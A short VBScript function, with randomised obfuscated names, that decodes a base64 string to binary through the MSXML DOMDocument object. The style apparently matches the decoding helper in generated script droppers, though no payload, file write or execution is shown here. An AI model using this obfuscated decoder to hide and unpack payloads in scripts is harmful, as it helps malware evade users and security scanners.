Function yNowczUQV(gvOzICbRKDy)
	aBECIKknFYCX = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
		"dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
		gvOzICbRKDy & "</B64DECODE>"
	Set ITLBoWeMA = CreateObject("MSXML2.DOMDocument.3.0")
	ITLBoWeMA.LoadXML(aBECIKknFYCX)
	yNowczUQV = ITLBoWeMA.selectsinglenode("B64DECODE").nodeTypedValue
	set ITLBoWeMA = nothing
End Function

